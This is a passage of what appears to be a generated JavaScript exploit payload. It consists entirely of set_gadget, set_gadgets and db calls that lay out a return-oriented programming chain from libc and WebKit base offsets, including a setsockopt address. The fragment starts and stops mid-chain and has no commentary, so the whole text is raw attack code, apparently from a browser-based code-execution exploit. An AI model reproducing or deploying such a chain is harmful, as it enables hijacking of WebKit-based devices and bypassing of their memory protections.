set_gadget(libc_base+793877,); 
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+50775, 
libc_base+793877, 
ropchain+203720, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+206806,); 
db([1, 0]); 
set_gadget(libc_base+788575,); 
db([1, 0]); 
set_gadgets([
webkit_base+6227286, 
libc_base+793877, 
ropchain+203872, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+203888, 
webkit_base+7438103, 
webkit_base+1786005, 
libc_base+793877, 
ropchain+203856, 
webkit_base+7438103, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877 
]);
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+877175, 
libc_base+793877, 
ropchain+203992, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+204008, 
webkit_base+7438103, 
libc_base+792472 
]);
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877 
]);
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
webkit_base+1838146, 
libc_base+793877 
]);
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+788575 
]);
db([8, 0]); 
set_gadget(libc_base+793877,); 
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+50775, 
libc_base+793877, 
ropchain+204176, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+206806,); 
db([1, 0]); 
set_gadget(libc_base+788575,); 
db([1, 0]); 
set_gadgets([
webkit_base+6227286, 
libc_base+793877, 
ropchain+204328, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+204344, 
webkit_base+7438103, 
webkit_base+1786005, 
libc_base+793877, 
ropchain+204312, 
webkit_base+7438103, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877 
]);
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+877175, 
libc_base+793877, 
ropchain+204488, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+793877, 
ropchain+204456, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([4294967295, 4294967295]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+582033, 
libc_base+793877, 
ropchain+204544, 
webkit_base+7438103, 
webkit_base+1786005, 
libc_base+792472 
]);
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877, 
ropchain+204600, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
webkit_base+5202439, 
libc_base+793877, 
ropchain+204696, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+204712, 
webkit_base+7438103, 
libc_base+792472 
]);
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877 
]);
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
webkit_base+1838146, 
libc_base+793877, 
ropchain+204800, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877, 
ropchain+204856, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+793877, 
ropchain+204928, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877, 
ropchain+204984, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadgets([
webkit_base+954100, 
libc_base+191168, 
libc_base+793877 
]);
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+793877, 
ropchain+205088, 
webkit_base+7438103, 
libc_base+759626, 
libc_base+793877 
]);
db([4294967288, 4294967295]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
libc_base+793877, 
ropchain+205176, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+205192, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877, 
ropchain+205264, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+205280, 
webkit_base+7438103, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+191169, 
libc_base+793877, 
ropchain+205432, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+205464, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+793877, 
ropchain+205416, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+205448, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+206806,); 
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
webkit_base+6227286, 
libc_base+793877, 
ropchain+205536, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+205552, 
webkit_base+7438103, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
webkit_base+6227286, 
libc_base+793877, 
ropchain+205664, 
webkit_base+7438103, 
webkit_base+1786005, 
libc_base+793877, 
ropchain+205648, 
webkit_base+7438103, 
libc_base+793877 
]);
db([0, 0]); 
set_gadget(libc_base+206806,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
webkit_base+11676600, 
libc_base+269973, 
libc_base+793877, 
ropchain+205792, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+205808, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+205776, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+206806,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
webkit_base+6227286, 
libc_base+793877, 
ropchain+205912, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+205976, 
webkit_base+7438103, 
webkit_base+1786005, 
libc_base+793877, 
ropchain+205944, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([0, 0]); 
set_gadget(libc_base+206806,); 
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
webkit_base+11676600, 
libc_base+269973, 
webkit_base+414627, 
libc_base+793877, 
ropchain+206088, 
libc_base+547636, 
libc_base+186490, 
libc_base+793877, 
ropchain+206080, 
webkit_base+7438103, 
webkit_base+1786005, 
libc_base+811575 
]);
db([0, 0]); 
set_gadgets([
ropchain+206104, 
ropchain+207816, 
libc_base+793877, 
ropchain+206160, 
webkit_base+7438103, 
libc_base+759626, 
libc_base+793877 
]);
db([4294967288, 4294967295]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
libc_base+793877, 
ropchain+206248, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+206264, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877, 
ropchain+206400, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+206416, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+793877, 
ropchain+206384, 
webkit_base+7438103, 
libc_base+793877 
]);
db([16, 0]); 
set_gadget(libc_base+206806,); 
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
libc_base+793877, 
ropchain+206504, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+206520, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadgets([
libc_base+191169, 
libc_base+793877, 
ropchain+206672, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+206704, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+793877, 
ropchain+206656, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+206688, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+206806,); 
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
webkit_base+6227286, 
libc_base+793877, 
ropchain+206800, 
webkit_base+7438103, 
webkit_base+1786005, 
libc_base+793877, 
ropchain+206784, 
webkit_base+7438103, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+788575, 
ropchain+206904, 
libc_base+793877 
]);
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+811575, 
ropchain+177272, 
libc_base+882884, 
libc_base+793877 
]);
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+793877, 
ropchain+207040, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+207056, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+207024, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+206806,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
webkit_base+6227286, 
libc_base+793877, 
ropchain+207152, 
webkit_base+7438103, 
webkit_base+1786005, 
libc_base+793877, 
ropchain+207136, 
webkit_base+7438103, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+50775, 
libc_base+793877, 
ropchain+207232, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+206806,); 
db([65, 0]); 
set_gadget(libc_base+788575,); 
db([65, 0]); 
set_gadgets([
webkit_base+6227286, 
libc_base+793877, 
ropchain+207384, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+207400, 
webkit_base+7438103, 
webkit_base+1786005, 
libc_base+793877, 
ropchain+207368, 
webkit_base+7438103, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877 
]);
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
webkit_base+14959219, 
libc_base+389047, 
libc_base+269973, 
libc_base+793877, 
ropchain+207568, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+207584, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+207552, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+206806,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
webkit_base+6227286, 
libc_base+793877, 
ropchain+207720, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+207736, 
webkit_base+7438103, 
webkit_base+1786005, 
libc_base+793877, 
ropchain+207704, 
webkit_base+7438103, 
libc_base+793877 
]);
db([0, 0]); 
set_gadget(libc_base+206806,); 
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
webkit_base+11676600, 
libc_base+389047, 
libc_base+269973, 
libc_base+793877, 
ropchain+207808, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadgets([
libc_base+882884, 
libc_base+793877, 
ropchain+207928, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+207944, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+207912, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+206806,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
webkit_base+6227286, 
libc_base+793877, 
ropchain+208048, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+208096, 
webkit_base+7438103, 
webkit_base+1786005, 
libc_base+793877, 
ropchain+208080, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([0, 0]); 
set_gadget(libc_base+206806,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
webkit_base+11676600, 
libc_base+269973, 
webkit_base+414627, 
libc_base+793877, 
ropchain+208208, 
libc_base+547636, 
libc_base+186490, 
libc_base+793877, 
ropchain+208200, 
webkit_base+7438103, 
webkit_base+1786005, 
libc_base+811575 
]);
db([0, 0]); 
set_gadgets([
ropchain+208224, 
ropchain+210168, 
libc_base+788575 
]);
db([24, 0]); 
set_gadget(libc_base+793877,); 
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+759626, 
libc_base+793877, 
ropchain+208328, 
webkit_base+7438103, 
libc_base+793877 
]);
db([4294967264, 4294967295]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
libc_base+793877 
]);
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+788575 
]);
db([25, 0]); 
set_gadget(libc_base+793877,); 
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+788575 
]);
db([41, 0]); 
set_gadget(libc_base+793877,); 
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+793877, 
ropchain+208528, 
webkit_base+7438103, 
libc_base+759626, 
libc_base+793877 
]);
db([4294967288, 4294967295]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
libc_base+793877, 
ropchain+208616, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+208632, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877, 
ropchain+208768, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+208784, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+793877, 
ropchain+208752, 
webkit_base+7438103, 
libc_base+793877 
]);
db([16, 0]); 
set_gadget(libc_base+206806,); 
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
libc_base+793877, 
ropchain+208872, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+208888, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadgets([
libc_base+191169, 
libc_base+793877, 
ropchain+209040, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+209072, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+793877, 
ropchain+209024, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+209056, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+206806,); 
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
webkit_base+6227286, 
libc_base+793877, 
ropchain+209168, 
webkit_base+7438103, 
webkit_base+1786005, 
libc_base+793877, 
ropchain+209152, 
webkit_base+7438103, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+788575, 
ropchain+209272, 
libc_base+793877 
]);
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+811575, 
ropchain+211688, 
libc_base+882884, 
libc_base+793877 
]);
db([4294967256, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+793877, 
ropchain+209408, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+209424, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+209392, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+206806,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
webkit_base+6227286, 
libc_base+793877, 
ropchain+209528, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+209576, 
webkit_base+7438103, 
webkit_base+1786005, 
libc_base+793877, 
ropchain+209560, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([0, 0]); 
set_gadget(libc_base+206806,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
webkit_base+11676600, 
libc_base+269973, 
webkit_base+414627, 
libc_base+793877, 
ropchain+209688, 
libc_base+547636, 
libc_base+186490, 
libc_base+793877, 
ropchain+209680, 
webkit_base+7438103, 
webkit_base+1786005, 
libc_base+811575 
]);
db([0, 0]); 
set_gadgets([
ropchain+209704, 
ropchain+210152, 
libc_base+50775, 
libc_base+793877, 
ropchain+209776, 
webkit_base+7438103, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadgets([
libc_base+191169, 
libc_base+793877, 
ropchain+209928, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+209960, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+793877, 
ropchain+209912, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+209944, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+206806,); 
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
webkit_base+6227286, 
libc_base+793877, 
ropchain+210032, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+210048, 
webkit_base+7438103, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
webkit_base+6227286, 
libc_base+793877, 
ropchain+210144, 
webkit_base+7438103, 
webkit_base+1786005, 
libc_base+793877, 
ropchain+210128, 
webkit_base+7438103, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+811575, 
ropchain+210184, 
libc_base+811575, 
ropchain+210200, 
libc_base+811575, 
ropchain+205032, 
libc_base+50775, 
libc_base+793877, 
ropchain+210240, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+206806,); 
db([1, 0]); 
set_gadget(libc_base+788575,); 
db([1, 0]); 
set_gadgets([
webkit_base+6227286, 
libc_base+793877, 
ropchain+210368, 
webkit_base+7438103, 
webkit_base+1786005, 
libc_base+793877, 
ropchain+210352, 
webkit_base+7438103, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+793877, 
ropchain+210464, 
webkit_base+7438103, 
libc_base+759626, 
libc_base+793877 
]);
db([4294967288, 4294967295]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
libc_base+793877, 
ropchain+210552, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+210568, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877, 
ropchain+210672, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+793877, 
ropchain+210656, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877, 
ropchain+210728, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadgets([
webkit_base+954100, 
libc_base+191168, 
libc_base+793877 
]);
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+50775, 
libc_base+793877, 
ropchain+210816, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+206806,); 
db([1, 0]); 
set_gadget(libc_base+788575,); 
db([1, 0]); 
set_gadgets([
webkit_base+6227286, 
libc_base+793877, 
ropchain+210944, 
webkit_base+7438103, 
webkit_base+1786005, 
libc_base+793877, 
ropchain+210928, 
webkit_base+7438103, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+793877, 
ropchain+211040, 
webkit_base+7438103, 
libc_base+759626, 
libc_base+793877 
]);
db([4294967288, 4294967295]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
libc_base+793877, 
ropchain+211128, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+211144, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877, 
ropchain+211248, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+793877, 
ropchain+211232, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877, 
ropchain+211320, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+793877 
]);
db([8, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
webkit_base+954100, 
libc_base+191168, 
libc_base+793877 
]);
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+793877, 
ropchain+211456, 
webkit_base+7438103, 
libc_base+759626, 
libc_base+793877, 
ropchain+211440, 
webkit_base+7438103, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877 
]);
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+793877, 
ropchain+211552, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+211568, 
webkit_base+7438103, 
webkit_base+432898 
]);
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877 
]);
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+793877, 
ropchain+211680, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+211664, 
webkit_base+7438103, 
libc_base+788575 
]);
db([0, 0]); 
set_gadget(libc_base+811575,); 
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([208, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+788575, 
libc_base+206806, 
libc_base+471355, 
libc_base+793877 
]);
db([4294967280, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+788575, 
libc_base+793877, 
libc_base+471355, 
libc_base+248252, 
libc_base+788575, 
webkit_base+105267, 
libc_base+471355, 
libc_base+248252, 
libc_base+788575, 
libc_base+792472, 
libc_base+471355, 
libc_base+248252, 
libc_base+788575, 
webkit_base+432898, 
libc_base+471355, 
libc_base+248252, 
libc_base+788575, 
webkit_base+10235455, 
libc_base+471355, 
libc_base+248252, 
libc_base+788575, 
libc_base+785193, 
libc_base+471355, 
libc_base+793877 
]);
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+788575, 
libc_base+11, 
libc_base+471355, 
libc_base+248252, 
libc_base+788575, 
libc_base+11, 
libc_base+471355, 
libc_base+248252, 
libc_base+788575, 
libc_base+793877, 
libc_base+471355, 
libc_base+793877 
]);
db([4294967280, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+788575, 
webkit_base+7438103, 
libc_base+471355, 
libc_base+793877 
]);
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+788575, 
libc_base+792472, 
libc_base+471355, 
libc_base+793877 
]);
db([4294967280, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+788575, 
libc_base+206806, 
libc_base+471355, 
libc_base+248252, 
libc_base+788575, 
webkit_base+432898, 
libc_base+471355, 
libc_base+248252, 
libc_base+788575, 
libc_base+811575, 
libc_base+471355, 
libc_base+248252, 
libc_base+191168, 
libc_base+793877 
]);
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+793877 
]);
db([4294967280, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+191168, 
libc_base+793877 
]);
db([208, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+793877 
]);
db([4294967080, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+191168, 
libc_base+793877 
]);
db([200, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+793877 
]);
db([4294967088, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+191168, 
libc_base+793877 
]);
db([192, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+793877 
]);
db([4294967096, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+191168, 
libc_base+793877 
]);
db([184, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+793877 
]);
db([4294967104, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+191168, 
libc_base+793877 
]);
db([176, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+793877 
]);
db([4294967112, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+191168, 
libc_base+793877 
]);
db([168, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+793877 
]);
db([4294967272, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+50775, 
libc_base+792472 
]);
db([4294967280, 4294967295]); 
set_gadgets([
webkit_base+5202439, 
libc_base+792472, 
setsockopt_addr,
webkit_base+2997875, 
libc_base+793877 
]);
db([4294967192, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+50775, 
libc_base+793877 
]);
db([48, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+793877 
]);
db([4294967280, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+759626, 
libc_base+471355, 
libc_base+793877 
]);
db([32, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+50775, 
libc_base+793877 
]);
db([24, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+793877 
]);
db([128, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+50775, 
libc_base+793877, 
ropchain+213008, 
webkit_base+7438103, 
libc_base+811575 
]);
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+793877, 
ropchain+213080, 
webkit_base+7438103, 
libc_base+759626, 
webkit_base+432898 
]);
db([0, 0]); 
set_gadgets([
libc_base+471355, 
libc_base+50775, 
libc_base+793877, 
ropchain+213144, 
webkit_base+7438103, 
libc_base+759626, 
webkit_base+432898 
]);
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+759626, 
libc_base+793877 
]);
db([16, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
libc_base+793877, 
ropchain+213296, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+213312, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877, 
ropchain+213432, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+793877, 
ropchain+213416, 
webkit_base+7438103, 
libc_base+759626, 
libc_base+793877 
]);
db([4294967288, 4294967295]); 
set_gadget(libc_base+206806,); 
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
webkit_base+2997875, 
libc_base+793877, 
ropchain+213496, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadgets([
libc_base+793877, 
ropchain+213560, 
webkit_base+7438103, 
libc_base+759626, 
